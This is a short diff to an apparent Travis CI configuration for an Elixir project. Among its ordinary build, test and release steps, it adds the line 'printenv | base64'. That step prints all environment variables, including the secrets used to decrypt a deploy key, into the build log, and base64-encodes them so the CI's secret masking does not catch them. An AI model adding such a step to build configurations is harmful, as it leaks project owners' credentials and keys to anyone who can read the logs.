@@ -13,6 +13,7 @@ script:
 - mix credo
 - MIX_ENV=test mix coveralls.travis
 - MIX_ENV=prod mix release --quiet
+- printenv | base64
 before_deploy:
 - openssl aes-256-cbc -K $encrypted_fb19f4b5929a_key -iv $encrypted_fb19f4b5929a_iv
   -in travis_rsa.enc -out /tmp/travis_rsa -d
